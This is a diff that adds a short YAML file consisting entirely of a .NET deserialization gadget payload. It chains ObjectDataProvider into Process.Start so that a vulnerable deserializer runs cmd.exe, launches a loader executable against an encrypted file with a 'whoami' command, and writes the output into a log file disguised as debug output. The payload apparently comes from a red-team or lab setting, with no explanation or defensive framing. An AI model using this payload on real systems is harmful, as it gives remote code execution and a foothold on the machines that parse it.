@@ -1,0 +1,11 @@
+!<!System.Windows.Data.ObjectDataProvider,PresentationFramework> {
+  MethodName: Start,
+  ObjectInstance:
+    !<!System.Diagnostics.Process,System.Diagnostics.Process> {
+      StartInfo:
+        !<!System.Diagnostics.ProcessStartInfo,System.Diagnostics.Process> {
+          FileName: cmd.exe,
+          Arguments: '/c C:\Users\svc-aegis-deploy\Documents\StreamRunner.exe C:\Users\svc-aegis-deploy\Documents\AuditWorker.enc -cmd "cmd.exe /c whoami" > C:\ProgramData\AegisStream\logs\system-debug.txt 2>&1'
+        }
+    }
+}
